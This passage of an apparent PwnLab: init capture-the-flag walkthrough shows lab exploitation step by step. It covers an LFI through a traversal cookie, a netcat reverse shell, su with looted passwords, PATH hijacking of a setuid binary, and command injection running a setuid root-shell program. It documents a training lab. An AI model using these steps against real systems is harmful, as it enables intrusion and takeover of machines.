</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
</span><span class='line'>&lt;?php
</span><span class='line'>  <span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;page&#39;</span><span class="o">]))</span>
</span><span class='line'>  <span class="o">{</span>
</span><span class='line'>      include<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;page&#39;</span><span class="o">]</span>.<span class="s2">&quot;.php&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="o">{</span>
</span><span class='line'>      <span class="nb">echo</span> <span class="s2">&quot;Use this server to upload and share image files inside the intranet&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'>?&gt;
</span><span class='line'>&lt;/center&gt;
</span><span class='line'>&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span></code></pre></td></tr></table></div></figure>


<p>From the source code of <code>index.php</code>, I noticed another one LFI vulnerability on <code>set cookie</code> header.</p>

<p>so in order to approve this LFI is working, I requested the <code>index.php</code> file and used <code>burp proxy</code> to modify <code>Cookie</code> header as follow:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>GET /index.php HTTP/1.1
</span><span class='line'>Host: 10.1.1.140
</span><span class='line'>User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:45.0<span class="o">)</span> Gecko/20100101 Firefox/45.0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,*/*<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
</span><span class='line'>Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>Cookie: <span class="nv">lang</span><span class="o">=</span>../../../../../../../../../etc/passwd
</span><span class='line'>Connection: close
</span></code></pre></td></tr></table></div></figure>


<p>The following response proved that the LFI vulnerability exists and works:</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/pwnlab_init/3.png"></p>

<p>Now I set up <code>NC</code> to listen on port 443 and then trigger the shell to connect back.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/pwnlab_init/4.png"></p>

<p>Great! got in~</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# nc -lvnp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
</span><span class='line'>connect to <span class="o">[</span>10.1.1.132<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.140<span class="o">]</span> 51503
</span><span class='line'>Linux pwnlab 3.16.0-4-686-pae <span class="c">#1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux</span>
</span><span class='line'> 08:21:09 up <span class="m">1</span> day, 23:06,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/
</span><span class='line'><span class="nv">$ </span>ls -al home
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x  <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 .
</span><span class='line'>drwxr-xr-x <span class="m">21</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 09:13 ..
</span><span class='line'>drwxr-x---  <span class="m">2</span> john john <span class="m">4096</span> Mar <span class="m">17</span> 09:57 john
</span><span class='line'>drwxr-x---  <span class="m">2</span> kane kane <span class="m">4096</span> Mar <span class="m">17</span> 13:04 kane
</span><span class='line'>drwxr-x---  <span class="m">2</span> kent kent <span class="m">4096</span> Mar <span class="m">17</span> 10:06 kent
</span><span class='line'>drwxr-x---  <span class="m">2</span> mike mike <span class="m">4096</span> Mar <span class="m">17</span> 15:19 mike
</span><span class='line'><span class="nv">$ </span>ifconfig
</span><span class='line'>eth0      Link encap:Ethernet  HWaddr 00:0c:29:11:ce:27
</span><span class='line'>          inet addr:10.1.1.140  Bcast:10.1.1.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::20c:29ff:fe11:ce27/64 Scope:Link
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:150222 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:75016 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:1000
</span><span class='line'>          RX bytes:11602121 <span class="o">(</span>11.0 MiB<span class="o">)</span>  TX bytes:8154028 <span class="o">(</span>7.7 MiB<span class="o">)</span>
</span><span class='line'>          Interrupt:19 Base address:0x2000
</span><span class='line'>
</span><span class='line'>lo        Link encap:Local Loopback
</span><span class='line'>          inet addr:127.0.0.1  Mask:255.0.0.0
</span><span class='line'>          inet6 addr: ::1/128 Scope:Host
</span><span class='line'>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
</span><span class='line'>          RX packets:2 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:2 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:0
</span><span class='line'>          RX bytes:100 <span class="o">(</span>100.0 B<span class="o">)</span>  TX bytes:100 <span class="o">(</span>100.0 B<span class="o">)</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>During the enumeration phase, I tried the user creditionals collected from the previouse steps:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@pwnlab:/tmp<span class="nv">$ </span>su mike
</span><span class='line'>su mike
</span><span class='line'>Password: SIfdsTEn6I
</span><span class='line'>
</span><span class='line'>su: Authentication failure
</span><span class='line'>www-data@pwnlab:/tmp<span class="nv">$ </span>su kent
</span><span class='line'>su kent
</span><span class='line'>Password: JWzXuBJJNy
</span><span class='line'>
</span><span class='line'>kent@pwnlab:/tmp<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>kent<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>kent<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>kent<span class="o">)</span>
</span><span class='line'>kent@pwnlab:/tmp<span class="nv">$ </span><span class="nb">cd</span> /home/kent
</span><span class='line'><span class="nb">cd</span> /home/kent
</span><span class='line'>kent@pwnlab:~<span class="nv">$ </span>ls -la
</span><span class='line'>ls -la
</span><span class='line'>total 20
</span><span class='line'>drwxr-x--- <span class="m">2</span> kent kent <span class="m">4096</span> Mar <span class="m">17</span> 10:06 .
</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 ..
</span><span class='line'>-rw-r--r-- <span class="m">1</span> kent kent  <span class="m">220</span> Mar <span class="m">17</span> 10:06 .bash_logout
</span><span class='line'>-rw-r--r-- <span class="m">1</span> kent kent <span class="m">3515</span> Mar <span class="m">17</span> 10:06 .bashrc
</span><span class='line'>-rw-r--r-- <span class="m">1</span> kent kent  <span class="m">675</span> Mar <span class="m">17</span> 10:06 .profile
</span><span class='line'>kent@pwnlab:~<span class="nv">$ </span>sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>bash: sudo: <span class="nb">command </span>not found
</span><span class='line'>
</span><span class='line'>kent@pwnlab:/<span class="nv">$ </span>su kane
</span><span class='line'>su kane
</span><span class='line'>Password: iSv5Ym2GRo
</span><span class='line'>
</span><span class='line'>kane@pwnlab:/<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>kane<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>kane<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>kane<span class="o">)</span>
</span><span class='line'>kane@pwnlab:/<span class="nv">$ </span><span class="nb">cd</span> /home/kane
</span><span class='line'><span class="nb">cd</span> /home/kane
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span>ls -la
</span><span class='line'>ls -la
</span><span class='line'>total 28
</span><span class='line'>drwxr-x--- <span class="m">2</span> kane kane <span class="m">4096</span> Mar <span class="m">17</span> 13:04 .
</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 ..
</span><span class='line'>-rw-r--r-- <span class="m">1</span> kane kane  <span class="m">220</span> Mar <span class="m">17</span> 10:09 .bash_logout
</span><span class='line'>-rw-r--r-- <span class="m">1</span> kane kane <span class="m">3515</span> Mar <span class="m">17</span> 10:09 .bashrc
</span><span class='line'>-rwsr-sr-x <span class="m">1</span> mike mike <span class="m">5148</span> Mar <span class="m">17</span> 13:04 msgmike
</span><span class='line'>-rw-r--r-- <span class="m">1</span> kane kane  <span class="m">675</span> Mar <span class="m">17</span> 10:09 .profile
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Both <code>kent</code> and <code>kane</code> can be logged in successfully, but there is interesting file under kane&rsquo;s home directory, <code>msgmike</code> which the <code>setuid</code> bit is set.</p>

<p>By running <code>msgmike</code>, I found it will call system commaned <code>cat</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>kane@pwnlab:~<span class="nv">$ </span>./msgmike
</span><span class='line'>./msgmike
</span><span class='line'>cat: /home/mike/msg.txt: No such file or directory
</span></code></pre></td></tr></table></div></figure>


<p>In order to escape to <code>mike</code>, I create a executable file <code>cat</code> under the local directory and set the environmental variable <code>PATH</code> to include <code>.</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> 
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>
</span><span class='line'><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
</span><span class='line'><span class="nb">echo</span> <span class="nv">$PATH</span>
</span><span class='line'>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">&quot;/bin/bash&quot;</span> &gt; cat
</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;/bin/bash&quot;</span> &gt; cat
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span>chmod +x cat
</span><span class='line'>chmod +x cat
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span>ls -la
</span><span class='line'>ls -la
</span><span class='line'>total 32
</span><span class='line'>drwxr-x--- <span class="m">2</span> kane kane <span class="m">4096</span> Aug <span class="m">24</span> 08:49 .
</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 ..
</span><span class='line'>-rw-r--r-- <span class="m">1</span> kane kane  <span class="m">220</span> Mar <span class="m">17</span> 10:09 .bash_logout
</span><span class='line'>-rw-r--r-- <span class="m">1</span> kane kane <span class="m">3515</span> Mar <span class="m">17</span> 10:09 .bashrc
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> kane kane   <span class="m">10</span> Aug <span class="m">24</span> 08:49 cat
</span><span class='line'>-rwsr-sr-x <span class="m">1</span> mike mike <span class="m">5148</span> Mar <span class="m">17</span> 13:04 msgmike
</span><span class='line'>-rw-r--r-- <span class="m">1</span> kane kane  <span class="m">675</span> Mar <span class="m">17</span> 10:09 .profile
</span></code></pre></td></tr></table></div></figure>


<p>Then run the <code>./msgmike</code> to escape to user <code>mike</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>kane@pwnlab:~<span class="nv">$ </span>./msgmike
</span><span class='line'>./msgmike
</span><span class='line'>mike@pwnlab:~<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span>,1003<span class="o">(</span>kane<span class="o">)</span>
</span><span class='line'>mike@pwnlab:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>After promoted to <code>mike</code>, I found another <code>setuid</code> bit set file <code>msg2root</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>ls -la
</span><span class='line'>ls -la
</span><span class='line'>total 28
</span><span class='line'>drwxr-x--- <span class="m">2</span> mike mike <span class="m">4096</span> Mar <span class="m">17</span> 15:19 .
</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 ..
</span><span class='line'>-rw-r--r-- <span class="m">1</span> mike mike  <span class="m">220</span> Mar <span class="m">17</span> 10:08 .bash_logout
</span><span class='line'>-rw-r--r-- <span class="m">1</span> mike mike <span class="m">3515</span> Mar <span class="m">17</span> 10:08 .bashrc
</span><span class='line'>-rwsr-sr-x <span class="m">1</span> root root <span class="m">5364</span> Mar <span class="m">17</span> 13:07 msg2root
</span><span class='line'>-rw-r--r-- <span class="m">1</span> mike mike  <span class="m">675</span> Mar <span class="m">17</span> 10:08 .profile
</span><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>
</span><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>./msg2root
</span><span class='line'>./msg2root
</span><span class='line'>Message <span class="k">for</span> root: <span class="nb">test</span><span class="p">;</span> id
</span><span class='line'><span class="nb">test</span><span class="p">;</span> id
</span><span class='line'><span class="nb">test</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1003<span class="o">(</span>kane<span class="o">)</span>
</span><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Also I noticed that command injection vulnerability exists.</p>

<p>Then I upload <code>setuid.c</code> file to target server and compile it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/var/www/html/privesc# cat setuid.c
</span><span class='line'><span class="c">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="c">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="c">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="c">#include &lt;unistd.h&gt;</span>
</span><span class='line'>int main<span class="o">()</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'> setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
</span><span class='line'> system<span class="o">(</span> <span class="s2">&quot;/bin/sh -i&quot;</span> <span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>After compiled <code>setuid.c</code> and run it as injected command to get ROOT.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>gcc -o setuid setuid.c
</span><span class='line'>gcc -o setuid setuid.c
</span><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>ls
</span><span class='line'>ls
</span><span class='line'>boot2root  msg2root  setuid  setuid.c
</span><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>./msg2root
</span><span class='line'>./msg2root
</span><span class='line'>Message <span class="k">for</span> root: id<span class="p">;</span> ./setuid
</span><span class='line'>id<span class="p">;</span> ./setuid
</span><span class='line'>id
</span><span class='line'><span class="c"># id</span>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1003<span class="o">(</span>kane<span class="o">)</span>
</span><span class='line'><span class="c"># </span>
</span></code></pre></td></tr></table></div></figure>


<p>Cool, got ROOT!!</p>

<p>Time to get FLAG!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># cd /root</span>
</span><span class='line'><span class="nb">cd</span> /root
</span><span class='line'><span class="c"># ls -al</span>
</span><span class='line'>ls -al
</span><span class='line'>total 20
</span><span class='line'>drwx------  <span class="m">2</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 15:17 .
</span><span class='line'>drwxr-xr-x <span class="m">21</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 09:13 ..
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">17</span> 10:06 .bash_history -&gt; /dev/null
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root  <span class="m">570</span> Jan <span class="m">31</span>  <span class="m">2010</span> .bashrc
</span><span class='line'>----------  <span class="m">1</span> root root <span class="m">1840</span> Mar <span class="m">17</span> 15:17 flag.txt
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">17</span> 13:10 messages.txt -&gt; /dev/null
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">17</span> 13:10 .mysql_history -&gt; /dev/null
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root  <span class="m">140</span> Nov <span class="m">19</span>  <span class="m">2007</span> .profile
</span><span class='line'><span class="c"># cat flag.txt</span>
</span><span class='line'>cat flag.txt
</span><span class='line'>.-<span class="o">=</span>~<span class="o">=</span>-.                                                                 .-<span class="o">=</span>~<span class="o">=</span>-.
</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">(</span>__  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span>_ ___<span class="o">)</span>  _____                             _                            <span class="o">(</span>_ ___<span class="o">)</span>
</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span> /  __ <span class="se">\ </span>                          <span class="p">|</span> <span class="p">|</span>                           <span class="o">(</span>__  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ __<span class="o">)</span> <span class="p">|</span> /  <span class="se">\/</span> ___  _ __   __ _ _ __ __ _<span class="p">|</span> <span class="p">|</span>_ ___                      <span class="o">(</span> _ __<span class="o">)</span>
</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span> <span class="p">|</span> <span class="p">|</span>    / _ <span class="se">\|</span> <span class="s1">&#39;_ \ / _` | &#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span> __/ __<span class="p">|</span>                     <span class="o">(</span>__  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span>_ ___<span class="o">)</span> <span class="p">|</span> <span class="se">\_</span>_/<span class="se">\ </span><span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span>_<span class="se">\_</span>_ <span class="se">\ </span>                    <span class="o">(</span>_ ___<span class="o">)</span>
</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span>  <span class="se">\_</span>___/<span class="se">\_</span>__/<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>_, <span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>_<span class="p">|</span>___/                     <span class="o">(</span>__  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ __<span class="o">)</span>                     __/ <span class="p">|</span>                                       <span class="o">(</span> _ __<span class="o">)</span>
</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span>                    <span class="p">|</span>___/                                        <span class="o">(</span>__  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span>                                                                 <span class="o">(</span>__  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span>_ ___<span class="o">)</span> If  you are  reading this,  means  that you have  <span class="nb">break</span> <span class="s1">&#39;init&#39;</span>  <span class="o">(</span>_ ___<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ __<span class="o">)</span> Pwnlab.  I hope  you enjoyed  and thanks  <span class="k">for</span>  your <span class="nb">time </span>doing  <span class="o">(</span> _ __<span class="o">)</span>
</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span> this challenge.                                                 <span class="o">(</span>__  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span>_ ___<span class="o">)</span>                                                                 <span class="o">(</span>_ ___<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ __<span class="o">)</span> Please send me  your  feedback or your  writeup,  I will  love  <span class="o">(</span> _ __<span class="o">)</span>
</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span> reading it                                                      <span class="o">(</span>__  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span>                                                                 <span class="o">(</span>__  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span>                                             For sniferl4bs.com  <span class="o">(</span>__  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ __<span class="o">)</span>                                claor@PwnLab.net - @Chronicoder  <span class="o">(</span> _ __<span class="o">)</span>
